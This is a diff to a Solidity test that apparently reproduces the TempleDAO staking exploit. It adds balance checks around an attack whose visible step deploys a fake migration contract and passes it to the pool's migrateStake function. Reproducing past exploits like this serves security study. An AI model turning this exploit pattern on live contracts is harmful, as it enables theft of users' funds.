@@ -9,7 +9,8 @@ import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
 
 interface IStax {
     function migrateStake(address oldStaking, uint256 amount) external;
-    function withdrawAll(bool claim) external; 
+    function withdrawAll(bool claim) external;
+    function balanceOf(address) external returns (uint256);
 }
 
 contract Exploit_TempleDAO is TestHarness, TokenBalanceTracker {
@@ -30,7 +31,8 @@ contract Exploit_TempleDAO is TestHarness, TokenBalanceTracker {
         console.log('Attacker balances');
         logBalances(address(this));
         console.log('Stax Pool balances');
-        logBalances(address(stax));     
+        logBalances(address(stax));
+        uint256 balanceBefore = stax.balanceOf(address(this));
 
         console.log('------- STEP 1: MIGRATE -------');
         address migrationTarget = address(new FakeMigrate{salt: bytes32(0)}());
@@ -49,7 +51,9 @@ contract Exploit_TempleDAO is TestHarness, TokenBalanceTracker {
         console.log('Attacker balances');
         logBalances(address(this));
         console.log('Stax Pool balances');
-        logBalances(address(stax));  
+        logBalances(address(stax));
+        uint256 balanceAfter = stax.balanceOf(address(this));
+        assertGe(balanceAfter, balanceBefore);
     }
 }
 
